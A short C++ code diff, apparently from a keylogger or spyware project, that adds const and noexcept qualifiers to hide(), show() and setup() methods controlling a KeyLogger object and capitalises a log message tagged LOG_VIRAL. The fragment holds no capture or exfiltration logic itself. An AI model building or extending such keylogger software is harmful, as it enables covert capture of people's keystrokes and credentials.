@@ -28,20 +28,20 @@ namespace spi
           _log(logging::Info) << LOG_VIRAL << " shutting down." << std::endl;
         }
 
-        void hide()
+        void hide() const noexcept
         {
             _keylogger->stop();
         }
 
-        void show()
+        void show() const noexcept
         {
             _keylogger->run();
         }
 
-        void setup(KeyLogger *keylogger)
+        void setup(KeyLogger *keylogger) noexcept
         {
             _keylogger = keylogger;
-            _log(logging::Info) << LOG_VIRAL << " successfully initialized" << std::endl;
+            _log(logging::Info) << LOG_VIRAL << " Successfully initialized" << std::endl;
         }
 
     private:
